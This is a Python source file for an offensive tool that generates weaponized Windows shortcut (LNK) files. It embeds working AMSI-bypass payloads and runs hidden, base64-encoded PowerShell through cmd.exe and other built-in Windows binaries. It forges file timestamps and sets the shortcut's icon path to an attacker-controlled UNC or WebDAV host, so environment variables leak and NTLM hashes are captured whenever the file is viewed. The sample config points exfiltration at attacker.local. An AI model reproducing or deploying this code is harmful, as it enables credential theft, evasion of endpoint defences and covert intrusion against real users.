#!/usr/bin/env python3
"""
LNK Payload Generator - Modern Red Teaming Tool
Generates weaponized Windows shortcuts with advanced evasion and multi-protocol exfiltration.
"""

import argparse
import base64
import hashlib
import logging
import random
import string
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Optional, Dict, Any
from urllib.parse import quote_plus

import yaml
from pydantic import BaseModel, field_validator, ValidationError

# Platform detection
is_windows = sys.platform.startswith('win')

# Platform-specific dependencies
if is_windows:
    try:
        import win32com.client
    except ImportError:
        print("Install pywin32: pip install pywin32")
        sys.exit(1)
else:
    try:
        import pylnk3
    except ImportError:
        print("Install pylnk3: pip install pylnk3")
        sys.exit(1)


# =============================================================================
# CONFIGURATION & MODELS
# =============================================================================

class EvasionConfig(BaseModel):
    """Configuration for AV/EDR evasion techniques"""
    anti_amsi: bool = True
    anti_etw: bool = True
    jitter_min: int = 0
    jitter_max: int = 3000
    fake_timestamp: Optional[datetime] = None
    randomize_size: bool = True
    legitimate_target: bool = True

class ExfiltrationMethod(BaseModel):
    """Exfiltration channel configuration"""
    type: str = "unc"  # unc, http, dns, webhook
    host: str
    port: Optional[int] = None
    path: Optional[str] = None
    ssl: bool = False
    compress: bool = True  # SMB compression for UNC

class PayloadConfig(BaseModel):
    """Main payload configuration"""
    target_command: List[str]
    exfil_methods: List[ExfiltrationMethod]
    evasion: EvasionConfig
    additional_vars: List[str] = []
    ntlm_capture: bool = False

    @field_validator('target_command')
    @classmethod
    def validate_command(cls, v):
        if not v:
            raise ValueError("Command cannot be empty")
        return v

    @field_validator('exfil_methods')
    @classmethod
    def validate_exfil(cls, v):
        if not v:
            raise ValueError("At least one exfiltration method required")
        return v

    @field_validator('additional_vars')
    @classmethod
    def validate_vars(cls, v, info):
        # If not using NTLM capture, require at least one variable
        data = info.data
        if 'ntlm_capture' in data and not data['ntlm_capture'] and not v:
            raise ValueError("Must specify environment variables or enable ntlm_capture")
        return v


# =============================================================================
# EVASION ENGINE
# =============================================================================

class EvasionEngine:
    """Implements modern evasion techniques"""

    # Updated AMSI bypass techniques (2024-2025)
    AMSI_PATCHES = [
        # Memory patching via reflection (still effective with obfuscation)
        '$a=[Ref].Assembly.GetType("{0}{1}ent.{2}{3}ion.{4}{5}ls" -f "Syst","em.Managem","Autom","at","Amsi","Uti").GetField("{0}{1}ailed" -f "amsi","InitF","NonPublic,Static");$a.SetValue($null,$true)',
        # Registry-based bypass (less common detection)
        'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Name "(Default)" -Value ""',
        # Force AMSI initialization failure through exception
        'try{[Runtime.InteropServices.Marshal]::Copy(@(0x90,0x90,0xC3),0,[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),3)}catch{}',
    ]

    # Legitimate parent processes (LOLBAS)
    LEGITIMATE_TARGETS = {
        "explorer.exe": "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}",  # This PC
        "rundll32.exe": "shell32.dll,Control_RunDLL",
        "cmd.exe": "/c"
    }

    @staticmethod
    def generate_amsi_bypass() -> str:
        """Returns randomized AMSI bypass with string obfuscation"""
        patch = random.choice(EvasionEngine.AMSI_PATCHES)

        # Advanced obfuscation: character substitution and concatenation
        obfuscated = patch

        # Random variable for bypass
        var_name = ''.join(random.choices(string.ascii_lowercase, k=8))

        # Wrap in try-catch to suppress errors
        return f"try{{${var_name}={obfuscated}}}catch{{}}"

    @staticmethod
    def add_jitter(min_ms: int, max_ms: int) -> str:
        """Generates PowerShell sleep with jitter"""
        jitter = random.randint(min_ms, max_ms)
        # Obfuscate sleep command
        return f"Start-Sle''ep -Milli''seconds {jitter};"

    @staticmethod
    def obfuscate_command(cmd: str) -> str:
        """Multi-layer obfuscation using PowerShell -EncodedCommand"""
        # Encode to UTF-16LE (PowerShell native format)
        b64 = base64.b64encode(cmd.encode('utf-16le')).decode()

        # Return encoded command (PowerShell will decode automatically)
        return b64

    @staticmethod
    def generate_lnk_metadata() -> Dict[str, Any]:
        """Create realistic metadata"""
        # Random date within last 2 years
        now = datetime.now()
        fake_date = now - timedelta(days=random.randint(1, 730))

        return {
            "created": fake_date,
            "modified": fake_date + timedelta(minutes=random.randint(1, 60)),
            "accessed": fake_date,
            "size": random.randint(1024, 1048576) if random.choice([True, False]) else 272896
        }


# =============================================================================
# EXFILTRATION METHODS
# =============================================================================

class Exfiltrator:
    """Handles multi-protocol data exfiltration"""
    
    def __init__(self, config: ExfiltrationMethod):
        self.config = config
    
    def generate_unc_path(self, data: str) -> str:
        """Generate obfuscated UNC path with data"""
        host = self.config.host

        # Compress data if enabled (use hash to reduce path length)
        if self.config.compress:
            data_hash = hashlib.md5(data.encode()).hexdigest()[:8]
            path = f"Share_{data_hash}"
        else:
            # Sanitize data for UNC path (remove invalid characters)
            sanitized = data.replace('%', '').replace('$', '').replace(' ', '_')
            path = f"Share_{sanitized}"

        # Add random fragment to avoid caching
        fragment = random.randint(0, 999999)

        return f"\\\\{host}\\{path}\\{fragment}.ico"
    
    def generate_http_url(self, data: str) -> str:
        """Generate HTTP/S webhook URL"""
        scheme = "https" if self.config.ssl else "http"
        port = f":{self.config.port}" if self.config.port else ""
        encoded = quote_plus(base64.b64encode(data.encode()).decode())
        
        return f"{scheme}://{self.config.host}{port}{self.config.path or '/track'}?id={encoded}"
    
    def generate_webdav_path(self, data: str) -> str:
        """Generate WebDAV path for DNS/HTTP exfiltration via icon"""
        # WebDAV over HTTP/HTTPS allows icon loading with exfiltration
        scheme = "https" if self.config.ssl else "http"
        port = f":{self.config.port}" if self.config.port else ""

        # Encode data in subdomain for DNS exfiltration
        if self.config.type == "dns":
            # Use MD5 hash as subdomain for DNS exfil
            data_hash = hashlib.md5(data.encode()).hexdigest()[:16]
            host_with_data = f"{data_hash}.{self.config.host}"
        else:
            host_with_data = self.config.host

        # WebDAV UNC path format: \\host@SSL\path or \\host\path
        if self.config.ssl:
            return f"\\\\{host_with_data}@SSL@{self.config.port or 443}\\{self.config.path or 'webdav'}\\track.ico"
        else:
            return f"\\\\{host_with_data}@{self.config.port or 80}\\{self.config.path or 'webdav'}\\track.ico"

    def get_icon_path(self, data: str) -> str:
        """Dispatch based on exfiltration type"""
        if self.config.type == "unc":
            return self.generate_unc_path(data)
        elif self.config.type in ["http", "webhook", "dns"]:
            # Use WebDAV for HTTP/HTTPS/DNS exfiltration via icon
            return self.generate_webdav_path(data)
        else:
            raise ValueError(f"Unsupported exfiltration type: {self.config.type}")


# =============================================================================
# LNK GENERATOR
# =============================================================================

class LNKGenerator:
    """Main class for generating weaponized LNK files"""
    
    def __init__(self, config: PayloadConfig):
        self.config = config
        self.evasion = EvasionEngine()
        self.logger = logging.getLogger(__name__)
    
    def build_payload(self) -> str:
        """Construct the final payload PowerShell command"""
        parts = []

        # 1. Add AMSI bypass if enabled
        if self.config.evasion.anti_amsi:
            parts.append(self.evasion.generate_amsi_bypass())

        # 2. Add jitter
        if self.config.evasion.jitter_max > 0:
            parts.append(self.evasion.add_jitter(
                self.config.evasion.jitter_min,
                self.config.evasion.jitter_max
            ))

        # 3. Add target command execution
        target_cmd = ' '.join(self.config.target_command)
        parts.append(f"iex '{target_cmd}';")

        # 4. Build exfiltration data (if vars specified)
        if self.config.additional_vars:
            env_vars = "','".join(self.config.additional_vars)
            data_collection = f"$d=@{{}};'{env_vars}'.Split(',')| % {{$d[$_]=$env:$_}}"
            parts.append(data_collection)

        # Combine all parts
        final_ps = ' '.join(parts)
        return final_ps
    
    def generate_legitimate_target(self) -> tuple[str, str]:
        """Generate LOLBAS-based execution proxy"""
        payload = self.build_payload()

        if not self.config.evasion.legitimate_target:
            # Simple cmd.exe execution with encoded PowerShell
            ps_encoded = self.evasion.obfuscate_command(payload)
            return r"C:\Windows\System32\cmd.exe", f"/c powershell -NoP -NonI -W Hidden -Enc {ps_encoded}"

        # Use legitimate Windows binary
        parent, args_template = random.choice(list(
            EvasionEngine.LEGITIMATE_TARGETS.items()
        ))

        # Always use PowerShell encoded command
        ps_encoded = self.evasion.obfuscate_command(payload)

        if parent == "cmd.exe":
            args = f"{args_template} powershell -NoP -NonI -W Hidden -Enc {ps_encoded}"
        else:
            # For explorer.exe and rundll32.exe, still use cmd.exe as intermediary
            args = f"{args_template} && cmd /c powershell -NoP -NonI -W Hidden -Enc {ps_encoded}"

        return f"C:\\Windows\\System32\\{parent}", args
    
    def create_lnk(self, output_path: Path) -> None:
        """Generate the LNK file with evasion (cross-platform)"""
        try:
            # Prepare metadata
            metadata = self.evasion.generate_lnk_metadata()

            # Get target and arguments
            target, arguments = self.generate_legitimate_target()

            # Get icon path (first exfiltration method)
            icon_path = ""
            if self.config.exfil_methods:
                exfil = Exfiltrator(self.config.exfil_methods[0])
                # Use NTLM capture or environment variable in path
                if self.config.ntlm_capture:
                    # Simple NTLM capture via icon
                    fragment = random.randint(0, 50000)
                    icon_path = f"\\\\{self.config.exfil_methods[0].host}\\Share\\{fragment}.ico"
                else:
                    # Environment variable exfiltration
                    vars_path = '_'.join(f'%{v}%' for v in self.config.additional_vars)
                    icon_path = exfil.get_icon_path(vars_path)

            # Platform-specific LNK creation
            if is_windows:
                self._create_lnk_windows(output_path, target, arguments, icon_path)
            else:
                self._create_lnk_linux(output_path, target, arguments, icon_path, metadata)

            self.logger.info(
                f"LNK created: {output_path} | Target: {target} | Icon: {icon_path}"
            )

        except Exception as e:
            self.logger.error(f"LNK generation failed: {e}")
            raise

    def _create_lnk_windows(self, output_path: Path, target: str, arguments: str, icon: str) -> None:
        """Create LNK using Windows COM (most reliable on Windows)"""
        ws = win32com.client.Dispatch('wscript.shell')
        link = ws.CreateShortcut(str(output_path))
        link.TargetPath = target
        link.Arguments = arguments
        link.IconLocation = icon
        link.WindowStyle = 7  # Minimized
        link.save()

    def _create_lnk_linux(self, output_path: Path, target: str, arguments: str, icon: str, metadata: Dict) -> None:
        """Create LNK using pylnk3 (for Linux/macOS)"""
        # Use helper functions adapted from original generate.py
        def create_for_path(path: str, isdir: bool):
            return {
                'type': pylnk3.TYPE_FOLDER if isdir else pylnk3.TYPE_FILE,
                'size': metadata['size'],
                'created': metadata['created'],
                'accessed': metadata['accessed'],
                'modified': metadata['modified'],
                'name': path.split('\\')[-1]
            }

        def for_file(target_file: str):
            lnk = pylnk3.create(str(output_path))
            levels = target_file.split('\\')
            elements = [levels[0]]

            for level in levels[1:-1]:
                segment = create_for_path(level, True)
                elements.append(segment)

            segment = create_for_path(levels[-1], False)
            elements.append(segment)

            lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
            lnk.shell_item_id_list.items = elements
            return pylnk3.from_segment_list(elements, str(output_path))

        # Create the link
        try:
            link = for_file(target)
            link.arguments = arguments
            link.target = target
            link.icon = icon
            link.save(str(output_path))

            self.logger.debug(f"LNK saved using pylnk3: {output_path}")
        except Exception as e:
            # Fallback: use simple file creation
            self.logger.warning(f"pylnk3 advanced method failed: {e}, using basic approach")
            link = pylnk3.create(str(output_path))
            link.arguments = arguments
            link.icon = icon
            link.save(str(output_path))


# =============================================================================
# CLI INTERFACE
# =============================================================================

def setup_logging(verbose: bool = False):
    """Configure logging"""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

def load_config(config_file: Path) -> PayloadConfig:
    """Load configuration from YAML file"""
    try:
        with open(config_file) as f:
            data = yaml.safe_load(f)
        return PayloadConfig(**data)
    except (FileNotFoundError, ValidationError) as e:
        logging.error(f"Config error: {e}")
        sys.exit(1)

def create_sample_config():
    """Generate a sample configuration file"""
    sample = {
        "target_command": ["whoami", "ipconfig /all"],
        "additional_vars": ["USERNAME", "COMPUTERNAME", "USERDOMAIN"],
        "ntlm_capture": True,
        "evasion": {
            "anti_amsi": True,
            "anti_etw": True,
            "jitter_min": 1000,
            "jitter_max": 5000,
            "legitimate_target": True
        },
        "exfil_methods": [
            {
                "type": "unc",
                "host": "attacker.local",
                "compress": True
            },
            {
                "type": "http",
                "host": "attacker.local",
                "port": 8443,
                "ssl": True,
                "path": "/api/v1/exfil"
            }
        ]
    }
    
    with open("config.yml", "w") as f:
        yaml.dump(sample, f, default_flow_style=False)
    
    print("Sample config written to config.yml")
    sys.exit(0)


BANNER = r"""
  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
##                                         | $$       ##
##                Modern Red Team Edition  | $$       ##
##                                         |__/       ##
  ~==================================================~
"""

def main():
    parser = argparse.ArgumentParser(
        description="Advanced LNK Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --config config.yml --output malicious.lnk
  %(prog)s --generate-config
  %(prog)s --host 10.0.0.5 --vars USERNAME,COMPUTERNAME --execute "whoami"
        """
    )

    parser.add_argument(
        "--config", "-c",
        type=Path,
        help="YAML configuration file (recommended)"
    )

    parser.add_argument(
        "--output", "-o",
        type=Path,
        help="Output LNK file path"
    )

    parser.add_argument(
        "--host",
        help="Exfiltration host (legacy mode)"
    )

    parser.add_argument(
        "--vars",
        help="Comma-separated environment variables (legacy mode)"
    )

    parser.add_argument(
        "--execute", "-e",
        nargs="+",
        default=["whoami"],
        help="Command to execute (default: whoami)"
    )

    parser.add_argument(
        "--type",
        choices=["environment", "ntlm", "all"],
        default="all",
        help="Payload type: environment, ntlm, or all (default: all)"
    )

    parser.add_argument(
        "--generate-config",
        action="store_true",
        help="Create a sample configuration file"
    )

    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable debug logging"
    )

    args = parser.parse_args()

    # Show banner
    if not args.generate_config:
        print(BANNER)

    setup_logging(args.verbose)

    if args.generate_config:
        create_sample_config()

    # Validate required arguments
    if not args.output:
        parser.error("--output is required")

    # Load configuration
    if args.config:
        config = load_config(args.config)
    else:
        # Legacy mode fallback
        if not args.host:
            parser.error("--host required in legacy mode (or use --config)")

        # Determine what to capture based on type
        ntlm_capture = args.type in ["ntlm", "all"]
        additional_vars = []

        if args.type in ["environment", "all"]:
            if not args.vars:
                parser.error("--vars required for environment exfiltration")
            additional_vars = [v.strip() for v in args.vars.split(',')]

        config = PayloadConfig(
            target_command=args.execute,
            additional_vars=additional_vars,
            ntlm_capture=ntlm_capture,
            exfil_methods=[
                ExfiltrationMethod(
                    type="unc",
                    host=args.host,
                    compress=True
                )
            ],
            evasion=EvasionConfig()
        )

    # Generate LNK
    try:
        generator = LNKGenerator(config)
        generator.create_lnk(args.output)
        print(f"\n[+] LNK successfully created: {args.output}")
        print(f"[+] File size: {args.output.stat().st_size} bytes")
        print(f"[+] MD5: {hashlib.md5(args.output.read_bytes()).hexdigest()}")

        # Show exfiltration info
        if config.ntlm_capture:
            print(f"[*] NTLM capture enabled - monitor {config.exfil_methods[0].host}")
        if config.additional_vars:
            print(f"[*] Variables to exfiltrate: {', '.join(config.additional_vars)}")

    except ValidationError as e:
        print(f"[!] Configuration error: {e}")
        sys.exit(1)
    except Exception:
        logging.exception("Generation failed")
        sys.exit(1)


if __name__ == "__main__":
    main()